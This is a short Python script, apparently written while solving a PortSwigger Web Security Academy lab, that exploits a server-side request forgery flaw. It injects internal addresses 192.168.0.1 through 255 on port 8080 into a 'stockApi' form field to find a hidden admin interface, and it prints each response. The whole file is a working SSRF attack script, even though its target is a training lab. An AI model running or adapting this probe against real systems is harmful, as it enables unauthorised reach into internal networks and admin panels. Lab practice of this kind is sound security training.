import requests
from urllib.parse import quote
base_url = 'https://0aad00dd0390770880f635a200820065.web-security-academy.net/product/stock'
results = []
for i in range(1, 256):
    ip = f'192.168.0.{i}'
    target_url = f'http://{ip}:8080/admin'
    payload = quote(target_url)
    data = {'stockApi': payload}
    response = requests.post(base_url, data=data)
    

    # print the status_code and len(response.text) as instructed
    print(f'{ip}: ({response.status_code}, {len(response.text)})')
    print(response.text)
    results.append((ip, response.status_code, len(response.text)))
    # Early stop if found 200
    if response.status_code == 200:
        break
# No answer for this step
answer = None
